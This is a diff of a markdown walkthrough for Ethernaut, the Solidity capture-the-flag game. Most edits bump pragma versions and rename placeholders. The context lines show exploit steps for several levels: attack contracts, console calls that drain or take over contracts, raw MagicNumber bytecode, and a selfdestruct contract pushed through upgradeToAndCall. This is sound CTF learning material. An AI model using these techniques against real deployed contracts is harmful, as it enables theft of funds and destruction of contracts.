@@ -65,7 +65,6 @@ contract.Fal1out()
 `CoinFlip.sol` ==> create and copy content of this level.<br>
 replace:<br> 
 - `@openzeppelin/contracts/math/SafeMath.sol` => `https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol`<br>
-- `pragma solidity ^0.6.0;` => `pragma solidity ^0.8.0;`
 
 `CoinFlipAttack.sol`
 ```
@@ -108,7 +107,7 @@ check `words` property is `[10, anything_there]`
 `Telephone.sol` ==> create and copy content of this level.<br>
 `TelephoneAttack.sol`
 ```
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 import './Telephone.sol';
 
 contract TelephoneAttack {
@@ -141,6 +140,7 @@ console
 contract.transfer('<any_address>', 20 + 1);
 ```
 
+===> submit level
 
 ### Delegation
 console<br>
@@ -244,7 +244,7 @@ Deploy with params:<br>
 `Elevator.sol` ==> create and copy content of this level.<br>
 `ElevatorAttack.sol`
 ```
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 import './Elevator.sol';
 
 contract ElevatorAttack {
@@ -285,7 +285,7 @@ Copy logged address.
 `Privacy.sol` ===> copy in this level
 <br>`PrivacyAttack.sol`
 ```
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 import './Privacy.sol';
 
 contract PrivacyAttack {
@@ -304,8 +304,7 @@ contract PrivacyAttack {
 Deploy with params:<br>
 - address: `contract.address` get on console window
 
-Click buttuon attack with param is address_copied
-
+Click unlock button with param is copied_address
 
 ===> submit level
 
@@ -363,7 +362,7 @@ Copy address:<br>
 
 console:
 ```
-await contract.setFirstTime("address_copied")
+await contract.setFirstTime("copied_address")
 await contract.setFirstTime("12345")
 ```
 ===> submit level
@@ -385,7 +384,7 @@ await web3.eth.sendTransaction({
     data: data
 })
 ```
-===> submit level -->
+===> submit level 
 
 ### MagicNumber
 console
@@ -394,6 +393,9 @@ bytecode = '600a600c600039600a6000f3602a60505260206050f3'
 txn = await web3.eth.sendTransaction({from: player, data: bytecode});
 await contract.setSolver(txn.contractAddress);
 ```
+
+===> submit level 
+
 ### Alien Codex
 console
 ```
@@ -423,7 +425,7 @@ Copy deployed Contracts (like in Preservation level) -->
 
 console
 ```
-await contract.setWithdrawPartner("<address_copied>");
+await contract.setWithdrawPartner("<copied_address>");
 await contract.withdraw();
 ```
 
@@ -431,7 +433,7 @@ await contract.withdraw();
 `Shop.sol` => copy from this level
 <br>`ShopAttack.sol`
 ```
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 import './Shop.sol';
 
@@ -498,7 +500,7 @@ await web3.eth.call({from: player, to: implAddr, data: upgraderData}).then(v => 
 `BombEngine.sol`
 ```
 // SPDX-License-Identifier: MIT
-pragma solidity <0.7.0;
+pragma solidity ^0.6.0;
 
 contract BombEngine {
     function explode() public {
@@ -507,11 +509,11 @@ contract BombEngine {
 }
 ```
 Deploy 
-Copy deployed Contracts (like in Preservation level)
+Copy deployed contract address (like in Preservation level)
 
 console
 ```
-bombAddr = '<address_contact_deployed>'
+bombAddr = '<deployed_contract_address>'
 explodeData = web3.eth.abi.encodeFunctionSignature("explode()")
 upgradeSignature = {
     name: 'upgradeToAndCall',
